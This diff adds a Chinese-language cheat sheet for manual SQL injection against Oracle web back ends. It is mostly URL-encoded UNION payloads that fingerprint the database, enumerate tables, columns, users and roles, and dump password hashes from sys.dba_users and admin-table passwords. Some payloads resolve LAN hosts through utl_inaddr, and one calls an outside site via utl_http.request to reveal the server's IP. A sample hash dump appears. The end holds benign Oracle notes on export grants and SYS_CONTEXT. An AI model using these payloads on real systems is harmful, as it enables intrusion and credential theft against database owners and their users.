@@ -1,0 +1,354 @@
+oracle 支持  --        注释
+mysql  支持  /*   #    注释
+msql   支持 --  ；--   注释
+
+ and (select count(1) from sysobjects)%3E0 and 1=1    正常 mssql
+
+ and (select count(table_name) from user_tables)%3E0 and 1=1   正常oracle  user_table 是oracle的系统表
+
+看返回页面是不是有OR oracle字样。
+
+以面这些基本上可以确定下来是什么数据裤。
+
+
+                      *********dual存在的情况下来注入************
+
+------------------------------------------------------------------------------------ 
+order by N 来确定字段数。                假定确定是 4 个字段
+
+union all select null from dual--  				也可以来确定字段数
+union all select null,null from dual--                       	查询块具有不正确的结果列数
+union all select null,null,null from dual--			查询块具有不正确的结果列数
+union all select null,null,null,null from dual--	        显示正常	
+
+字段类型：
+and 1=2 union all select '1',null,null,null from dual--         正常说明‘1’这个位置是字符型。
+
+and 1=2 union all select '1','2',null,null from dual--          表达式必须具有与对应表达式相同的数据类型    说明‘2’这个是数据型或其他
+
+最终确定：
+and 1=2 union all select '1',null,'3','4' from dual--           正常
+
+爆版本记录数：
+
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Ccount(*)%7C%7Cchr(94)%7C%7Cchr(94),null,'3','4' from v$version where 1=1 --
+
+  %&C%7C=||  orace连接字符的，"1"这个位置是字符型，所以用他来连接^^count()^^显示出结果。
+
+
+爆版本内容：
+
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cbanner%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from (select rownum r,banner from (select rownum r,banner from v$version where rownum%3C=1 order by 1 desc) t where r%3E1-1 order by 1)t where 1=1 -- 
+第二条
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cbanner%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from (select rownum r,banner from (select rownum r,banner from v$version where rownum%3C=2 order by 1 desc) t where r%3E2-1 order by 1)t where 1=1 --
+
+第N条：修改这两处爆第N条的：rownum%3C=1 where r%3E1-1   要同时修改，值要相等，如rownun<=2 则where r>2-1   记录是从0开始的。
+
+--------------------------------------------------------------------------------------------
+1、rownum是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2， 
+　 依此类推，这个伪字段可以用于限制查询返回的总行数。 
+2、rownum不能以任何基表的名称作为前缀。 
+   看不懂的字段或函数请baidu 
+ ----------------------------------------------------------------------------------
+userenvip_address：
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Csys_context(chr(117)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(114)%7C%7Cchr(101)%7C%7Cchr(110)%7C%7Cchr(118),chr(105)%7C%7Cchr(112)%7C%7Cchr(95)%7C%7Cchr(97)%7C%7Cchr(100)%7C%7Cchr(100)%7C%7Cchr(114)%7C%7Cchr(101)%7C%7Cchr(115)%7C%7Cchr(115))%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from dual where 1=1 --
+
+sys_函数用法看最后
+
+数据裤名：
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cname%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from v$database where rownum=1 --
+数据裤当前用户名：
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cuser%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from user_tables where rownum=1 --
+
+All_users:所有用户名
+
+统计：
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ccount(*)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from all_users where 1=1 -- 
+
+内容：
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ca%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from (select rownum r,a from (select rownum r,username as a from all_users where rownum%3C=1 order by 1 desc) t where r%3E1-1 order by 1)t where 1=1 --
+
+第N条：修改这两处爆第N条的：rownum%3C=1 where r%3E1-1 
+
+判断权限：                granted_role是被分配的权限，default_role显示的是是否开启权限
+
+判断有几种权限：
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ccount(*)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from user_role_privs where 1=1 -- 
+
+逐条爆内容：
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cgranted_role%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from (select rownum r,granted_role from (select rownum r,granted_role from user_role_privs where rownum%3C=1 order by 1 desc) t where r%3E1-1 order by 1)t where 1=1 --
+
+SESSION_ROLES
+已经 在会话中得到启用的角色被列举在SESSION_ROLES数据目录视图中  就象mssql中sa用户，但是只有db权限一样。这里也是一样，虽然是dba权限，但也有可能是其他。
+
+统计：
+
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ccount(*)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from session_roles where 1=1 --
+
+逐条爆内容：
+
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Crole%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from (select rownum r,role from (select rownum r,role from session_roles where rownum%3C=1 order by 1 desc) t where r%3E1-1 order by 1)t where 1=1 --
+
+通过下面来判定些基本信息：
+
+control_files：and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cvalue%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from v$parameter where name=chr(99)%7C%7Cchr(111)%7C%7Cchr(110)%7C%7Cchr(116)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(108)%7C%7Cchr(95)%7C%7Cchr(102)%7C%7Cchr(105)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(115) --
+    db_domain: and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cvalue%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from v$parameter where name=chr(100)%7C%7Cchr(98)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(111)%7C%7Cchr(109)%7C%7Cchr(97)%7C%7Cchr(105)%7C%7Cchr(110) --
+instance_name: and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cvalue%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from v$parameter where name=chr(105)%7C%7Cchr(110)%7C%7Cchr(115)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(110)%7C%7Cchr(99)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(110)%7C%7Cchr(97)%7C%7Cchr(109)%7C%7Cchr(101) --
+ servic_names: and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cvalue%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from v$parameter where name=chr(115)%7C%7Cchr(101)%7C%7Cchr(114)%7C%7Cchr(118)%7C%7Cchr(105)%7C%7Cchr(99)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(110)%7C%7Cchr(97)%7C%7Cchr(109)%7C%7Cchr(101)%7C%7Cchr(115) --
+  dispatchers: and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cvalue%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from v$parameter where name=chr(100)%7C%7Cchr(105)%7C%7Cchr(115)%7C%7Cchr(112)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(99)%7C%7Cchr(104)%7C%7Cchr(101)%7C%7Cchr(114)%7C%7Cchr(115) -- 
+登陆日记：
+and 1=2 union all select (select member from v$logfile where rownum=1),null,null,null  from dual--
+
+-------------------------------------------------------------------------------
+                                     爆所用户的hash值：
+
+统计记录数：
+
+%20and%201=2%20union%20all%20select%20chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ccount(*)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null%20%20from%20sys.dba_users%20where%201=1%20--
+
+逐条爆内容：
+
+%20and%201=2%20union%20all%20select%20chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ca%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null%20%20from%20(select%20rownum%20r,a%20from%20(select%20rownum%20r,username%7C%7Cchr(58)%7C%7Cpassword%7C%7Cchr(58)%7C%7Cname%7C%7Cchr(58)%7C%7Cutl_inaddr.get_host_name%7C%7Cchr(58)%20as%20a%20from%20sys.dba_users,sys.v_$database%20where%20rownum%3C=1%20order%20by%201%20desc)%20t%20where%20r%3E1-1%20order%20by%201)t%20where%201=1%20--
+
+^^^MDDATA:DF02A496267DEE66 :DLZW:    BACKUPSVR:^^^
+   用户   hash             数据裤名  主机名
+
+爆出他局域网中其他主机的内容：
+%20and%201=2%20union%20all%20select%20chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ca%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null%20%20from%20(select%20rownum%20r,a%20from%20(select%20rownum%20r,username%7C%7Cchr(58)%7C%7Cpassword%7C%7Cchr(58)%7C%7Cname%7C%7Cchr(58)%7C%7Cutl_inaddr.get_host_name('192.168.224.3')%7C%7Cchr(58)%20as%20a%20from%20sys.dba_users,sys.v_$database%20where%20rownum%3C=1%20order%20by%201%20desc)%20t%20where%20r%3E1-1%20order%20by%201)t%20where%201=1%20--
+
+
+UTL_INADDR.get_host_name返回环境中主机名
+
+
+Oracle包utl_inaddr
+作用:用于取得局域网或Internet环境中的主机名和IP地址. 
+
+1、utl_inaddr.get_host_address 环境中IP地址
+如果查询失败，则提示系统错误
+查询www.qq.com的IP地址
+select UTL_INADDR.get_host_address('www.qq.com') from dual;
+查询本机IP地址
+select UTL_INADDR.get_host_address() from dual;
+查询局域网内yuechu的IP地址
+select UTL_INADDR.get_host_address('yuechu') from dual;
+
+2、UTL_INADDR.get_host_name返回环境中主机名
+返回本机主机名
+select UTL_INADDR.get_host_name() from dual;
+返回局域网内指定IP地址的主机名
+select UTL_INADDR.get_host_name('192.168.0.156') from dual;
+返回intrenet中指定IP地址的网址
+select UTL_INADDR.get_host_name('219.153.50.84') from dual;
+---------------------------------------------------------------------------------
+读外网ip：
+
+%20or%20chr(91)%20in%20(select%20utl_http.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(105)%7C%7Cchr(112)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7Cchr(54)%7C%7Cchr(55)%7C%7Cchr(49)%7C%7Cchr(51)%7C%7Cchr(48)%7C%7Cchr(49)%7C%7Cchr(53))%20from%20dual)%20and%201=1
+
+utl_http.request（http://www.nosec.org/product/oracle_ip.php?id=6713015）
+
+再访问：http://www.nosec.org/product/oracle_ip.txt
+
+
+ 爆表：
+
+ 统计表：
+
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ccount(*)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from user_tables where 1=1 -- 
+ 爆第一个表名：
+
+and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ctable_name%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from (select rownum r,table_name from (select rownum r,table_name from user_tables where rownum%3C=1 order by 1 desc) t where r%3E1-1 order by 1)t where 1=1 --
+
+
+爆列名：这里只爆admin.
+
+ 统计列名数：
+
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ccount(*)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from user_tab_columns where table_name=chr(65)%7C%7Cchr(68)%7C%7Cchr(77)%7C%7Cchr(73)%7C%7Cchr(78) -- 
+爆第一个列名：
+
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ccolumn_name%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from (select rownum r,column_name from (select rownum r,column_name from user_tab_columns where rownum%3C=1 and table_name=chr(65)%7C%7Cchr(68)%7C%7Cchr(77)%7C%7Cchr(73)%7C%7Cchr(78) order by 1 desc) t where r%3E1-1 order by 1)t where 1=1 -- 
+
+爆内容：
+
+ 统计记录条数：
+
+ and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Ccount(*)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from admin where 1=1 --
+ 爆第一条用户名：
+
+and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cusername%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from (select rownum r,username from (select rownum r,username from admin where rownum%3C=1 and 1=1 order by 1 desc) t where r%3E1-1 order by 1)t where 1=1 --
+ 爆第一个用户的密码：
+
+and 1=2 union all select chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cpassword%7C%7Cchr(94)%7C%7Cchr(94)%7C%7Cchr(94),null,null,null  from (select rownum r,password from (select rownum r,password from admin where rownum%3C=1 and 1=1 order by 1 desc) t where r%3E1-1 order by 1)t where 1=1 --
+
+
+
+
+
+
+在备份导出数据时，发现对SYS.DBMS_EXPORT_EXTENSION和SYS.DBMS_DEFER_IMPORT_INTERNAL没有执行权限。
+简单的赋予执行权限给导出用户即可。
+在10g R2里，数据导入和导出都使用了包SYS.DBMS_EXPORT_EXTENSION和SYS.DBMS_DEFER_IMPORT_INTERNAL；
+其实oracle自己说这是一个BUG：Bug  6392040
+但是到11g后，传统的exp和imp将不再提供，所以也就没有PATCH提供给大家了，所以最简单的解决方法是：赋权限给需要的用户。
+命令：
+sqlplus “/as sysdba”
+grant execute on sys.dbms_export_extension to 导出用户;
+grant execute on sys.dbms_defer_import_internal to 导出用户;
+
+
+
+
+userenv和sys_context函数
+
+这两个函数用来记录连接的session信息，经常用于触发器中，记录客户端的连接信息（比如IP）。我比较关注的是sessionid和ip，但是 select userenv('sessionid')得到的并不是用户的sid，而是v$session中的audsid，sid根据audsid再得到：
+SQL> select sid from v$session where audsid=userenv('sessionid');
+       SID
+----------
+       159
+
+
+下面记录了两个函数的具体用法：
+ 
+1、 USERENV(OPTION)
+　　　　返回当前的会话信息.
+　　　　OPTION='ISDBA'若当前是DBA角色,则为TRUE,否则FALSE.
+　　　　OPTION='LANGUAGE'返回数据库的字符集.
+　　　　OPTION='SESSIONID'为当前会话标识符.
+　　　　OPTION='ENTRYID'返回可审计的会话标识符.
+　　　　OPTION='LANG'返回会话语言名称的ISO简记.
+　　　　OPTION='INSTANCE'返回当前的实例.
+　　 OPTION='terminal'返回当前计算机名
+　　　　SELECT USERENV('LANGUAGE') FROM DUAL; 
+2、返回系统会话信息sys_context
+select 
+  SYS_CONTEXT('USERENV','TERMINAL') terminal, 
+  SYS_CONTEXT('USERENV','LANGUAGE') language, 
+  SYS_CONTEXT('USERENV','SESSIONID') sessionid, 
+  SYS_CONTEXT('USERENV','INSTANCE') instance, 
+  SYS_CONTEXT('USERENV','ENTRYID') entryid, 
+  SYS_CONTEXT('USERENV','ISDBA') isdba, 
+  SYS_CONTEXT('USERENV','NLS_TERRITORY') nls_territory, 
+  SYS_CONTEXT('USERENV','NLS_CURRENCY') nls_currency, 
+  SYS_CONTEXT('USERENV','NLS_CALENDAR') nls_calendar, 
+  SYS_CONTEXT('USERENV','NLS_DATE_FORMAT') nls_date_format, 
+  SYS_CONTEXT('USERENV','NLS_DATE_LANGUAGE') nls_date_language, 
+  SYS_CONTEXT('USERENV','NLS_SORT') nls_sort, 
+  SYS_CONTEXT('USERENV','CURRENT_USER') current_user, 
+  SYS_CONTEXT('USERENV','CURRENT_USERID') current_userid, 
+  SYS_CONTEXT('USERENV','SESSION_USER') session_user, 
+  SYS_CONTEXT('USERENV','SESSION_USERID') session_userid, 
+  SYS_CONTEXT('USERENV','PROXY_USER') proxy_user, 
+  SYS_CONTEXT('USERENV','PROXY_USERID') proxy_userid, 
+  SYS_CONTEXT('USERENV','DB_DOMAIN') db_domain, 
+  SYS_CONTEXT('USERENV','DB_NAME') db_name, 
+  SYS_CONTEXT('USERENV','HOST') host, 
+  SYS_CONTEXT('USERENV','OS_USER') os_user, 
+  SYS_CONTEXT('USERENV','EXTERNAL_NAME') external_name, 
+  SYS_CONTEXT('USERENV','IP_ADDRESS') ip_address, 
+  SYS_CONTEXT('USERENV','NETWORK_PROTOCOL') network_protocol, 
+  SYS_CONTEXT('USERENV','BG_JOB_ID') bg_job_id, 
+  SYS_CONTEXT('USERENV','FG_JOB_ID') fg_job_id, 
+  SYS_CONTEXT('USERENV','AUTHENTICATION_TYPE') authentication_type, 
+  SYS_CONTEXT('USERENV','AUTHENTICATION_DATA') authentication_data 
+  from dual 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
